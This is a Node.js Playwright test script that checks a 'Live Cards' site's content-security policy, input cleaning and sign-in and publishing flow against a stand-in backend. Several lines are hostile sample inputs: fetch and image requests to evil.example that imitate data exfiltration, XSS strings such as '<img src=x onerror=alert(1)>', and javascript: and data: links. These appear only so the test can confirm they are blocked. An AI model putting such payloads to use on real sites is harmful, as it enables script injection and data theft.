// End-to-end run of Live Cards under the exact headers in vercel.json, with a stand-in for the service that enforces the same rules as the database.
// Run: build the site, serve it on port 4799 (npx vite preview --port 4799), then: node tools/live-cards-security-test.cjs   (needs Playwright). Nothing real is contacted; the service is a stand-in inside the test.
const {chromium}=require('playwright');const fs=require('fs'),path=require('path');
const SITE=require('path').resolve(__dirname,'..'),B='http://localhost:4799',SB='https://glzodwhyavexpuusbqjy.supabase.co';
const V=JSON.parse(fs.readFileSync(SITE+'/vercel.json','utf8'));const rules=V.headers.map(h=>({re:new RegExp('^'+h.source+'$'),headers:h.headers}));
const out=[];const T=(ok,name,extra)=>{out.push((ok?'PASS ':'FAIL ')+name+(extra&&!ok?' :: '+extra:''));};
(async()=>{const b=await chromium.launch({args:['--use-gl=angle','--use-angle=swiftshader','--enable-unsafe-swiftshader','--ignore-gpu-blocklist']});
const ctx=await b.newContext({viewport:{width:390,height:844}});
const UID='11111111-2222-4333-8444-555555555555',files=new Map(),reports=[];let card=null,otpSent=0,calls=[];
const tok='t.'+Buffer.from(JSON.stringify({sub:UID})).toString('base64')+'.s';
const cors={'access-control-allow-origin':'*','access-control-allow-headers':'*','access-control-allow-methods':'GET,POST,PATCH,DELETE'};
const J=(r,body,status=200)=>r.fulfill({status,headers:{...cors,'content-type':'application/json'},body:JSON.stringify(body)});
const mediaOK=u=>new RegExp('^'+SB.replace(/\./g,'\\.')+'/storage/v1/object/public/live-cards/'+UID+'/(bg|logo)-[a-z0-9]{1,16}\\.(jpg|mp4|mov|webm)$').test(u||'')?u:'';
const linkOK=u=>/^https?:\/\/[^\s<>"'`]{3,}$/.test(u||'')?u:'';
function cleanCard(p){const a=p.actions||{},g=p.background||{},l=p.logo||{};let type=['scene','image','video'].includes(g.type)?g.type:'scene';const url=mediaOK(g.url);if(type!=='scene'&&!url)type='scene';
  return {v:1,name:String(p.name||'').slice(0,60),company:String(p.company||'').slice(0,60),role:String(p.role||'').slice(0,60),tagline:String(p.tagline||'').slice(0,90),accent:/^#[0-9a-f]{6}$/i.test(p.accent||'')?p.accent:'#2563eb',
    logo:{url:mediaOK(l.url),mark:false,line1:String(l.line1||'').slice(0,24),line2:String(l.line2||'').slice(0,24)},
    actions:{phone:String(a.phone||''),text:a.text===true,email:String(a.email||''),booking:linkOK(a.booking),bookingLabel:String(a.bookingLabel||''),website:linkOK(a.website),facebook:linkOK(a.facebook),instagram:linkOK(a.instagram),linkedin:linkOK(a.linkedin),tiktok:linkOK(a.tiktok),youtube:linkOK(a.youtube)},
    background:{type,id:/^[a-z]{2,12}$/.test(g.id||'')?g.id:'ocean',url:type==='scene'?'':url,fit:g.fit==='band'?'band':'fill',bg:/^#[0-9a-f]{6}$/i.test(g.bg||'')?g.bg:'#000000',sound:g.sound!==false},showMade:true}}
await ctx.route(SB+'/**',async r=>{const q=r.request(),u=new URL(q.url()),m=q.method(),pth=u.pathname;calls.push(m+' '+pth);
  if(m==='OPTIONS')return r.fulfill({status:204,headers:cors});
  const authed=(q.headers()['authorization']||'')==='Bearer '+tok;let body=null;try{body=q.postDataJSON()}catch(e){}
  if(pth==='/auth/v1/otp'){otpSent++;return J(r,{})}
  if(pth==='/auth/v1/verify')return body&&body.token==='123456'?J(r,{access_token:tok,refresh_token:'r1',expires_in:3600,user:{id:UID,email:body.email}}):J(r,{msg:'Token has expired or is invalid'},403);
  if(pth==='/auth/v1/logout')return J(r,{});
  if(pth==='/rest/v1/rpc/lc_slug_available')return J(r,!(card&&card.slug===body.p_slug)&&!['admin','studio'].includes(body.p_slug));
  if(pth==='/rest/v1/rpc/lc_get_card')return J(r,card&&card.slug===body.p_slug&&card.published?card.data:null);
  if(pth==='/rest/v1/rpc/lc_report'){reports.push(body);return r.fulfill({status:204,headers:cors})}
  if(pth==='/rest/v1/rpc/lc_delete_account'){if(!authed)return J(r,{message:'no'},401);card=null;return r.fulfill({status:204,headers:cors})}
  if(pth==='/rest/v1/lc_cards'){if(m==='GET'&&!authed)return J(r,{message:'permission denied for table lc_cards',code:'42501'},401);
    if(m==='GET')return J(r,card?[card]:[]);if(!authed)return J(r,{message:'no'},401);
    if(m==='POST'){card={id:'c0000000-0000-4000-8000-000000000001',slug:body.slug,data:cleanCard(body.data),published:!!body.published,updated_at:new Date().toISOString()};return J(r,[card],201)}
    if(m==='PATCH'){Object.assign(card,{slug:body.slug,data:cleanCard(body.data),published:!!body.published});return J(r,[card])}}
  if(pth.startsWith('/storage/v1/object/list/')){return J(r,[...files.keys()].map(n=>({name:n.split('/')[1]})))}
  if(pth.startsWith('/storage/v1/object/public/live-cards/')){const n=pth.split('/live-cards/')[1],f=files.get(n);return f?r.fulfill({status:200,headers:{...cors,'content-type':f.type},body:f.buf}):r.fulfill({status:404,headers:cors,body:''})}
  if(pth==='/storage/v1/object/live-cards'&&m==='DELETE'){for(const n of body.prefixes)files.delete(n);return J(r,[])}
  if(pth.startsWith('/storage/v1/object/live-cards/')&&m==='POST'){const n=pth.split('/live-cards/')[1],type=q.headers()['content-type'];
    const ok=authed&&new RegExp('^'+UID+'/(bg|logo)-[a-z0-9]{1,16}\\.(jpg|mp4|mov|webm)$').test(n)&&['image/jpeg','video/mp4','video/quicktime','video/webm'].includes(type)&&files.size<8;
    if(!ok)return J(r,{message:'new row violates row-level security policy',statusCode:'403'},403);files.set(n,{type,buf:q.postDataBuffer()});return J(r,{Key:'live-cards/'+n})}
  return J(r,{message:'unexpected '+m+' '+pth},500)});
// site with the real headers; service switched on for the test only
await ctx.route(B+'/**',async r=>{const u=new URL(r.request().url());let p=u.pathname;
  if(p==='/live/config.js')return r.fulfill({status:200,contentType:'text/javascript',body:fs.readFileSync(SITE+'/public/live/config.js','utf8').replace('enabled:false','enabled:true').replace("key:''","key:'test-publishable-key'")});
  let res;if(/^\/c\/[a-z0-9-]+$/.test(p))res=await r.fetch({url:B+'/c/index.html'});else res=await r.fetch();
  const headers={...res.headers()};for(const x of rules)if(x.re.test(p))for(const h of x.headers)headers[h.key.toLowerCase()]=h.value;
  if(headers['content-security-policy'])headers['content-security-policy']=headers['content-security-policy'].replace(/;\s*upgrade-insecure-requests/,'');
  await r.fulfill({response:res,headers})});
const errs=[];const page=async(url)=>{const p=await ctx.newPage();p.on('pageerror',e=>errs.push(url+' pageerror '+e.message));p.on('console',m=>{if(m.type()==='error'&&!/Failed to load resource/.test(m.text()))errs.push(url+' console '+m.text().slice(0,260))});p.on('dialog',d=>d.accept('This card pretends to be my business'));
  const resp=await p.goto(B+url);p._csp=resp.headers()['content-security-policy']||'';await p.waitForTimeout(1300);return p};

// 1. policy present and strict on every app page, old looser policy not used
for(const u of ['/studio/','/c/?id=sample','/live-cards/','/live-cards/terms/','/live-cards/privacy/']){const p=await page(u);const c=p._csp;
  T(c.includes("default-src 'none'")&&c.includes("script-src 'self';")&&!c.includes('unsafe-inline')&&!c.includes('posthog')&&c.includes("frame-ancestors 'none'"),'strict policy on '+u,c.slice(0,120));await p.close()}
{const p=await page('/card/');T(p._csp.includes("default-src 'self'")&&p._csp.includes('posthog'),'rest of the site keeps its own policy');await p.close()}

// 2. the policy really blocks injected script, outside requests and outside pictures
{const p=await page('/studio/');const r=await p.evaluate(async()=>{const o={};
  try{const s=document.createElement('script');s.textContent='window.__inj=1';document.body.appendChild(s)}catch(e){}o.inline=!!window.__inj;
  try{document.body.insertAdjacentHTML('beforeend','<img src=x onerror="window.__inj2=1">')}catch(e){}await new Promise(r=>setTimeout(r,300));o.handler=!!window.__inj2;
  try{eval('window.__inj3=1')}catch(e){}o.eval=!!window.__inj3;
  try{await fetch('https://evil.example/steal?t=1',{mode:'no-cors'});o.fetch=true}catch(e){o.fetch=false}
  o.img=await new Promise(res=>{const i=new Image();i.onload=()=>res(true);i.onerror=()=>res(false);i.src='https://evil.example/track.gif';setTimeout(()=>res(false),1500)});
  try{const f=document.createElement('iframe');f.src='https://evil.example/';document.body.appendChild(f);o.frame=true}catch(e){o.frame=false}
  return o});
  T(!r.inline,'injected inline script does not run');T(!r.handler,'injected event handler does not run');T(!r.eval,'eval is blocked');T(!r.fetch,'page cannot send data to an outside server');T(!r.img,'page cannot load an outside tracking picture');
  await p.waitForTimeout(500);const fr=await p.evaluate(()=>{try{return !!document.querySelector('iframe').contentDocument}catch(e){return false}});T(errs.some(e=>/frame-src/.test(e)),'outside page cannot be framed inside the app');await p.close();errs.length=0}
{const p=await page('/c/?id=sample');const ok=await p.evaluate(()=>{const e=window.LiveCard.init(document.createElement('div'));try{e.setBackground({type:'scene',id:'constructor'});e.setBackground({type:'image',url:'https://x.example/a.jpg") , url("https://evil.example/b'});return e.mode!=='custom'}catch(err){return false}});T(ok,'background engine refuses odd scene names and broken addresses');await p.close()}

// 3. hostile saved data cannot get through the card view
{const p=await page('/c/?id=sample');const r=await p.evaluate(()=>{const V=window.LiveCardView,n=V.normalize({name:'<img src=x onerror=alert(1)>',accent:'red;x',logo:{url:'https://evil.example/l.jpg'},
    actions:{website:'javascript:alert(1)',booking:'data:text/html,<script>1</script>',facebook:'vbscript:x',instagram:'https://ok.example/a'},
    background:{type:'image',url:'https://evil.example/x.jpg") , url("https://evil.example/2',bg:'url(x)',id:'constructor'}});
  return {n,m:[V.media('https://glzodwhyavexpuusbqjy.supabase.co/storage/v1/object/public/live-cards/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),V.media('https://glzodwhyavexpuusbqjy.supabase.co/storage/v1/object/public/other-bucket/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),
    V.media('https://glzodwhyavexpuusbqjy.supabase.co.evil.example/storage/v1/object/public/live-cards/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),V.media('/live/samples/bg-pcflat.mp4'),V.media('/live/samples/../../x'),V.media('//evil.example/x.jpg'),V.media('/brand/meridian-mark.png')]}});
  T(r.n.actions.website===''&&r.n.actions.booking===''&&r.n.actions.facebook===''&&r.n.actions.instagram==='https://ok.example/a','card view drops dangerous links, keeps normal ones');
  T(r.n.logo.url===''&&r.n.background.url===''&&r.n.background.type==='scene'&&r.n.background.bg==='#000000'&&r.n.accent==='#2563eb','card view drops outside pictures and bad colours');
  T(!!r.m[0]&&!r.m[1]&&!r.m[2]&&!!r.m[3]&&!r.m[4]&&!r.m[5]&&!!r.m[6],'only own-store, sample and brand files count as pictures',JSON.stringify(r.m));
  const h=await p.evaluate(()=>{const ph=document.getElementById('lc');window.LiveCardView.render(ph,{name:'<img src=x onerror="window.__x=1">',company:'<script>window.__x=1</script>'},{});return {x:!!window.__x,imgs:ph.querySelectorAll('.lc-name img,.lc-name script').length,txt:ph.querySelector('.lc-name').textContent}});
  T(!h.x&&h.imgs===0&&h.txt.startsWith('<img'),'names are shown as plain text, never as code');await p.close()}

// 4. a visitor cannot list cards; unknown card shows a plain message
{const p=await page('/c/nobody-here');T(await p.$eval('#lc-msg h1',e=>e.textContent)==='Card not found','unknown link shows "Card not found"');
  const st=await p.evaluate(async()=>{try{await fetch('https://glzodwhyavexpuusbqjy.supabase.co/rest/v1/lc_cards?select=*',{headers:{apikey:'test-publishable-key'}}).then(r=>r.status)}catch(e){return 0}return (await fetch('https://glzodwhyavexpuusbqjy.supabase.co/rest/v1/lc_cards?select=*')).status});
  T(st===401,'listing cards without an account is refused (stand-in mirrors the database rule)');await p.close()}

// 5. full journey: build, sign in with a code, publish with an uploaded picture, view, report, delete
{const p=await page('/studio/');await p.fill('#f-name','Jordan Rivers');await p.fill('#f-company','Rivers Realty');await p.fill('#f-role','Realtor');
  await p.click('#t-buttons');await p.fill('#f-phone','281-555-0142');await p.fill('#f-email','jordan@riversrealty.example');await p.fill('#f-web','riversrealty.example');await p.fill('#f-ig','javascript:alert(1)');
  await p.click('#t-bg');await p.setInputFiles('#f-bg',SITE+'/public/card/bg/houston-skyline.jpg');await p.waitForTimeout(1200);
  await p.click('#t-publish');await p.waitForTimeout(300);
  T(await p.$eval('#pub-email',e=>!e.hidden),'studio asks for sign-in before publishing');
  await p.fill('#f-acct','not-an-email');await p.$eval('#pub-email',f=>f.noValidate=true);await p.click('#pub-email button');await p.waitForTimeout(400);T(otpSent===0,'bad email never reaches the service');
  await p.fill('#f-acct','Jordan@RiversRealty.example');await p.click('#pub-email button');await p.waitForTimeout(600);T(otpSent===1,'sign-in code requested once');
  await p.fill('#f-code','000000');await p.click('#pub-code button');await p.waitForTimeout(600);T(await p.$eval('#pub-code',e=>!e.hidden),'wrong code is refused');
  await p.fill('#f-code','123456');await p.click('#pub-code button');await p.waitForTimeout(900);
  const ses=await p.evaluate(()=>JSON.parse(localStorage.getItem('lc_session')||'null'));T(!!ses&&ses.user.email==='jordan@riversrealty.example','signed in');
  await p.fill('#f-slug','admin');await p.$eval('#f-rights',e=>e.checked=true).catch(()=>{});await p.click('#pub-btn');await p.waitForTimeout(700);T(card===null,'reserved link name refused');
  await p.fill('#f-slug','jordan-rivers');await p.click('#pub-btn');await p.waitForTimeout(2500);
  T(!!card&&card.published&&card.slug==='jordan-rivers','card published',JSON.stringify(calls.slice(-8)));
  const names=[...files.keys()];T(names.length===1&&/^11111111-2222-4333-8444-555555555555\/bg-[a-z0-9]{1,16}\.jpg$/.test(names[0]),'upload used a safe generated file name',names.join());
  T(!!card&&card.data.background.type==='image'&&card.data.background.url.endsWith(names[0]||'x')&&card.data.actions.instagram==='','saved card holds own picture and no dangerous link');
  // publish again with a new picture: the old file is removed
  await p.click('#t-bg');await p.setInputFiles('#f-bg',SITE+'/public/card/bg/ribbon.jpg').catch(()=>{});await p.waitForTimeout(1200);await p.click('#t-publish');await p.waitForTimeout(300);
  T(await p.$eval('#pub-update',e=>!e.hidden),'after an edit the studio offers "Update my live card"');await p.click('#pub-update');await p.waitForTimeout(2500);
  T(files.size===1&&[...files.keys()][0]!==names[0],'replacing the picture removes the old file',[...files.keys()].join());
  await p.close()}
{const p=await page('/c/jordan-rivers');const name=await p.$eval('.lc-name',e=>e.textContent).catch(()=>'');T(name==='Jordan Rivers','public link shows the published card',name);
  const img=await p.evaluate(()=>{const i=document.querySelector('.lc-img');return i?getComputedStyle(i).backgroundImage:''});T(/live-cards\/11111111/.test(img),'published picture loads from the client folder',img.slice(0,120));
  const hrefs=await p.$$eval('.lc-card a',as=>as.map(a=>a.getAttribute('href')));T(hrefs.every(h=>/^(tel:|mailto:|sms:|https?:\/\/|\/live-cards\/)/.test(h)),'every button on the card is a safe link',hrefs.join(' '));
  await p.click('#lc-report');await p.waitForTimeout(600);T(reports.length===1&&reports[0].p_slug==='jordan-rivers','report goes through the throttled door');await p.close()}
{const p=await page('/studio/');await p.click('#t-publish');await p.waitForTimeout(500);await p.click('#acct-del');await p.waitForTimeout(200);await p.click('#acct-del');await p.waitForTimeout(1500);
  const ses=await p.evaluate(()=>localStorage.getItem('lc_session'));T(card===null&&files.size===0&&!ses,'delete my account removes the card, the files and the sign-in',JSON.stringify({card:!!card,files:files.size,ses:!!ses}));await p.close()}
T(errs.length===0,'no page errors and nothing blocked by the policy during normal use',errs.slice(0,6).join(' | '));
console.log(out.join('\n'));console.log(out.filter(x=>x.startsWith('FAIL')).length+' FAIL of '+out.length);await b.close()})().catch(e=>{console.log(out.join('\n'));console.error('CRASH',e.message);process.exit(1)});
